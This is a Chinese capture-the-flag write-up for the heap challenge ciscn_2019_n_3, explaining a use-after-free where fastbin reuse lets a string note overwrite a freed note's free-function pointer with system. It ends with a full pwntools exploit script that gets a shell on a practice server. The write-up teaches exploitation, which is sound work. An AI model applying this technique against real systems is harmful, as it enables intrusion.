---
title: ciscn_2019_n_3
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- heap
---

ciscn_2019_n_3，对UAF的利用
<!-- more -->

查壳,32位，除了PIE和RELRO其他都开了
![check](./ciscn_2019_n_3/check.png)

反汇编之后可以看到是个经典的菜单堆题。有四个功能，new note、del note、show note和purchase，购买的功能可以忽略。

note分为两种，一种是记录数字的，一种是记录字符串的，但结构是类似的，每个note的user data都是0xc大小。

```c
struct note
{
    int (*rec_print)(int);  //存放自定义print函数的函数指针，记录数字和记录字符串的print函数不一样
    int (*rec_free)(void*); //存放自定义free函数的函数指针，记录数字和记录字符串的free函数不一样
    int Integer;    //存放数字时是这样
    char* Text;     //存放字符串时是这样，会通过malloc(length)分配内存
}
```

main函数中存在system()函数，因此这次不用泄露libc得到system地址了。

这题主要的漏洞点在note的free函数中，在free后没有对指针赋NULL，存在UAF。

```c
int __cdecl rec_str_free(void *ptr)
{
  free(*((void **)ptr + 2));
  free(ptr);
  return puts("Note freed!");
}
```

可以看到并没有对record[index]赋NULL，因此即使del了一个note，该note仍然能被利用执行他的功能，如show note和del note。

```c
int do_del()
{
  int v0; // eax

  v0 = ask("Index");
  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);
}
```

这题中show和del都是依靠存放在note中的函数指针去实现的，我们可以尝试改写函数指针位置的内容为system，再调用对应的功能，就可以执行system函数。show note因为执行的是(*(int (__cdecl **)(int))(records[v0]))(records[v0])，不能执行system("/bin/sh")，因此考虑修改自定义的free函数指针。

修改函数指针则利用了fast bin的机制，执行free时，如果chunk的大小在fast bin范围内，会先放入fast bin，之后malloc的时候，如果malloc的chunk大小在fast bin的范围内，会优先在fast bin中查找有没有刚好满足大小的chunk，如果有，则直接返回。

而记录字符串的note会根据字符串的长度length申请一个chunk来存放字符串，通过设置length==0xc，可以申请到我们之前free的chunk，那么我们可以利用这个字符串来修改chunk中的数据，修改free函数指针为system，修改第一个4byte为"sh\x00\x00"，之后利用UAF，执行已经释放的note的del功能，就可以执行system("sh\x00\x00")了。

堆布局：
1.先申请两个integer note，并先后free掉
2.申请一个text note,并设置length==0xc，写入"sh\x00\x00"和system@plt
3.执行对应integer note的del note功能get shell。

```python
from pwn import*
elf=ELF("./ciscn_2019_n_3")
#p=process("./ciscn_2019_n_3")
p=remote('node4.buuoj.cn',29707)
context.log_level='debug'
sys=elf.plt['system']

def add_note(idx,type,size,value):
	p.recvuntil('CNote > ')
	p.sendline('1')
	p.recvuntil('Index > ')
	p.sendline(str(idx))
	p.recvuntil('Type > ')
	if type == 1:
		p.sendline('1')
		p.recvuntil('Value > ')
		p.sendline(str(value))
	else:
		p.sendline('2')
		p.recvuntil('Length > ')
		p.sendline(str(size))
		p.recvuntil('Value > ')
		p.sendline(str(value))
	p.recvuntil('Here is it:')

def del_note(idx):
	p.recvuntil('CNote > ')
	p.sendline('2')
	p.recvuntil('Index > ')
	p.sendline(str(idx))

def dump_note(idx):
	p.recvuntil('CNote > ')
	p.sendline('3')
	p.recvuntil('Index > ')
	p.sendline(str(idx))


add_note(0,1,0,1234)
add_note(1,1,0,5678)
del_note(1)
del_note(0)
payload="sh\x00\x00"+p32(sys)
add_note(2,2,12,payload)
del_note(1)
p.interactive()
```





